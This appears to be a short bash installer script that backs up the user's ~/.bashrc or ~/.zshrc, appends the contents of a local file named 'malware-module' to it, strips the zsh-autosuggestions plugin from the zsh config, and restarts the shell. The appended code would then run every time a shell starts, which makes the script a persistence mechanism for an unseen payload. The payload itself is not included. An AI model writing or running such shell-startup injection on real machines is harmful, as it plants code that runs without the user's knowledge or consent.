#!/bin/bash

if [[ "$SHELL" == "/bin/bash" ]]; then
  cp ~/.bashrc ~/.bashrc.bak
  cat ./malware-module >> ~/.bashrc
  exec bash
elif [[ "$SHELL" == "/bin/zsh" ]]; then
  cp ~/.zshrc ~/.zshrc.bak

  if [[ "$OSTYPE" == "darwin"* ]]; then
    sed -i '' -e 's/zsh-autosuggestions//g' ~/.zshrc
  else
    sed -i -e 's/zsh-autosuggestions//g' ~/.zshrc
  fi

  cat ./malware-module >> ~/.zshrc
  exec zsh
fi

